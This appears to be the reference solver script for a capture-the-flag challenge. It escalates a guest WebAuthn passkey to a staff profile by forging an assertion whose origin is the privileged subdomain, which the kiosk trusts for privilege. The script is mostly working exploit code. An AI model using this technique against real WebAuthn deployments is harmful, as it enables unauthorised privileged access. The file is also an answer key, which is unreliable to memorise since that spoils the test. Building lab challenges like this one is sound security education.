#!/usr/bin/env python3
"""C10 full reference solver — authenticate a guest passkey as staff via the
origin-subdomain privilege confusion, using only player-visible data.

The guest credential is registered to rpId `<rp>`. Per the WebAuthn spec, `<rp>` is a
registrable suffix of `staff.<rp>`, so an assertion with a `staff.<rp>` origin
verifies with the guest key — but the kiosk maps privilege from the origin subdomain,
so it authenticates as the privileged (staff) profile.
"""
import base64
import hashlib
import json
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
sys.path.insert(0, os.path.join(ROOT, "src", "lib"))
sys.path.insert(0, os.path.join(ROOT, "player", "client"))
import p256                     # noqa: E402
import cbor                     # noqa: E402
from client import Client        # noqa: E402


def build_assertion(cred_id, d, challenge, origin, rpid_for_hash, tamper_after_sign=False):
    """Construct a CTAP assertion. rpid_for_hash fills authData.rpIdHash (must match
    the credential's registered rpId to pass the verifier). tamper_after_sign mutates
    authData after signing (to prove the signature actually binds it)."""
    auth_data = hashlib.sha256(rpid_for_hash.encode()).digest() + bytes([0x01]) + (1).to_bytes(4, "big")
    client_data = json.dumps({"type": "webauthn.get", "challenge": challenge,
                              "origin": origin}, separators=(",", ":")).encode()
    z = int.from_bytes(hashlib.sha256(auth_data + hashlib.sha256(client_data).digest()).digest(), "big")
    k = 1 + (int.from_bytes(os.urandom(32), "big") % (p256.N - 1))
    r, s = p256.sign(d, z, k)
    if tamper_after_sign:
        auth_data = auth_data[:32] + bytes([0x01]) + (9).to_bytes(4, "big")
    sig = r.to_bytes(32, "big") + s.to_bytes(32, "big")
    return cbor.enc({1: cred_id.encode(), 2: auth_data, 3: sig, 4: client_data}).hex()


def solve_once(host, port, verbose=True):
    def log(*a):
        if verbose:
            print(*a, flush=True)

    my = json.load(open(os.path.join(ROOT, "player", "samples", "my_credential.json")))
    cred_id, rp_id, d = my["cred_id"], my["rp_id"], int(my["d"], 16)

    c = Client(host, port)
    info = c.info()
    privileged = info["privileged_profile"]
    origin = f"https://{privileged}.{rp_id}"
    log(f"[*] guest credential for rpId={rp_id!r}; privileged profile={privileged!r}")
    log(f"[*] using origin {origin} (rpId is a registrable suffix of it)")

    challenge = c.challenge()["challenge"]
    # rpIdHash is the GUEST rpId (matches the credential); origin is the staff subdomain
    assertion = build_assertion(cred_id, d, challenge, origin, rp_id)
    res = c.authenticate(assertion)
    log(f"[*] authenticate -> {res.get('status')} as profile={res.get('profile')!r}")
    if "flag" in res:
        log(f"\n[+] FLAG: {res['flag']}")
        return res["flag"]
    raise RuntimeError(f"did not obtain the stage-manager capability: {res}")


def main():
    info = json.load(open(os.path.join(ROOT, "player", "samples", "instance_public.json")))
    try:
        solve_once(info["gateway_host"], info["gateway_port"], verbose=True)
        return 0
    except Exception as ex:
        print(f"[-] solve failed: {ex}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
